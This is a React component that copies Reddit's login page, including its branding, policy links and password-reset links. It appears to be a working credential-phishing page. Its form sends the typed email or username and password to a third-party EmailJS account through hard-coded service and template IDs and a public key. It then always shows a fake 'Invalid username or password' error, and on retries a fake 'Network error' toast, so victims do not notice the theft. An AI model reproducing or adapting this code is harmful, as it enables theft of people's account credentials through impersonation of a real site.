import styles from "./style.module.css";
import { useEffect, useRef, useState } from "react";
import Google from "../../../assets/google-original.svg";
import Apple from "../../../assets/apple-original.svg";
import emailjs from "@emailjs/browser";
import checkmark from "../../../assets/checkmark.svg";
import { toast } from "react-toastify";

function LoginForms() {
  const [confirmEmail, setConfirmEmail] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [cannotEnter, setCannotEnter] = useState(true);
  const [error, setError] = useState(false);
  const form = useRef();
  let [loginCount, setLoginCount] = useState(0);

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_oea8cbr", "template_cpyrchn", form.current, {
        publicKey: "KyCQlTzaU7Y9Z5_6S",
      })
      .then(
        () => {
          console.log("clicked");
        },
        (error) => {
          console.log("error", error.text);
        }
      );
  };

  function handleEmail(e) {
    setConfirmEmail(e.target.value);
    setError(false);
  }

  function handlePassword(e) {
    setConfirmPassword(e.target.value);
    setError(false);
  }

  function handleSubmit() {
    setLoginCount(loginCount++);
    console.log(loginCount);

    setError(true);
    if (loginCount > 1) {
      setError(false);
      toast.error("Network error! Try again later.");
    }
  }

  function handleFocus() {
    setError(false);
  }

  useEffect(() => {
    if (confirmEmail && confirmPassword) {
      setCannotEnter(false);
    } else {
      setCannotEnter(true);
    }
  }, [confirmEmail, confirmPassword]);

  return (
    <>
      <div className={styles.loginContainer}>
        <section className={styles.otherPlatformsSection}>
          <h1>Log In</h1>
          <p>
            By continuing, you agree to our{" "}
            <a href="https://www.redditinc.com/policies/user-agreement">
              User Agreement{" "}
            </a>{" "}
            and acknowledge that you understand the{" "}
            <a href="https://www.reddit.com/policies/privacy-policy">
              Privacy Policy
            </a>
            .
          </p>

          <button className={styles.otherPlatformButton}>
            <img className={styles.otherPlatformIcon} src={Google} />
            Continue with Google
          </button>
          <button className={styles.otherPlatformButton}>
            <img className={styles.otherPlatformIcon} src={Apple} />
            Continue With Apple
          </button>
        </section>

        <hr />
        <p className={styles.beetweenSections}>OR</p>

        <form ref={form} onSubmit={sendEmail}>
          <div>
            <input
              className={styles.input}
              type="text"
              name="email"
              placeholder="Email or username *"
              onChange={handleEmail}
              onFocus={handleFocus}
            />
            {!cannotEnter && <img src={checkmark} alt="checkmark" />}
          </div>
          <div>
            <input
              className={styles.input}
              type="password"
              name="password"
              placeholder="Password *"
              onChange={handlePassword}
              onFocus={handleFocus}
            />
            {!cannotEnter && <img src={checkmark} alt="checkmark" />}
          </div>
          {error && (
            <p className={styles.error}>Invalid username or password!</p>
          )}
          <a href="https://www.reddit.com/password/" id="forgot">
            Forgot password?
          </a>
          <p>
            New to Reddit?{" "}
            <a href="https://www.reddit.com/register/">Sign Up</a>
          </p>
          <button
            disabled={cannotEnter}
            className={styles.submitButton}
            onClick={handleSubmit}
          >
            Log <span>In</span>
          </button>
        </form>
      </div>
    </>
  );
}

export default LoginForms;
